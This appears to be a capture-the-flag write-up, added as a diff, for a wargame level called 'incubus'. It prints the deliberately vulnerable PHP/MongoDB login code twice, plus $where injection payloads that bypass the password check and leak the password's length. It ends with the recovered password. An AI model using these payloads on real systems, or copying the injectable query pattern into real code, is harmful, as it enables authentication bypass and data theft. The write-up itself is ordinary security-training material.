@@ -1,0 +1,51 @@
+payload: ?id=admin&pw='%2bobj.pw%2b'
+query : {"$where":"function(){return obj.id=='admin'&&obj.pw==''+obj.pw+'';}"}
+Hello admin
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mongodb_connect();
+  if(preg_match('/prob|_|\(/i', $_GET['id'])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\(/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = array("\$where" => "function(){return obj.id=='{$_GET['id']}'&&obj.pw=='{$_GET['pw']}';}");
+  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
+  $result = mongodb_fetch_array($db->prob_incubus->find($query));
+  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";
+
+  $query = array("id" => "admin");
+  $result = mongodb_fetch_array($db->prob_incubus->find($query));
+  if($result['pw'] === $_GET['pw']) solve("incubus");
+  highlight_file(__FILE__);
+?>
+
+Injection works. Find the password length:
+Since we did obj.pw=''+obj.pw+'', we can can split obj.pw in separate chars.
+Like obj.pw[1] + obj.pw[2] + etc...
+
+payload: ?id=admin&pw=%27%2bobj.pw%5B0%5D%2bobj.pw%5B1%5D%2bobj.pw%5B2%5D%2bobj.pw%5B3%5D%2bobj.pw%5B4%5D%2bobj.pw%5B5%5D%2bobj.pw%5B6%5D%2bobj.pw%5B7%5D%2b%27
+8 characters length.
+
+Lets brute :) See 48_incubus.pl.
+
+query : {"$where":"function(){return obj.id=='admin'&&obj.pw=='b47822ea';}"}
+Hello admin
+INCUBUS Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mongodb_connect();
+  if(preg_match('/prob|_|\(/i', $_GET['id'])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\(/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = array("\$where" => "function(){return obj.id=='{$_GET['id']}'&&obj.pw=='{$_GET['pw']}';}");
+  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
+  $result = mongodb_fetch_array($db->prob_incubus->find($query));
+  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";
+
+  $query = array("id" => "admin");
+  $result = mongodb_fetch_array($db->prob_incubus->find($query));
+  if($result['pw'] === $_GET['pw']) solve("incubus");
+  highlight_file(__FILE__);
+?>
+
+
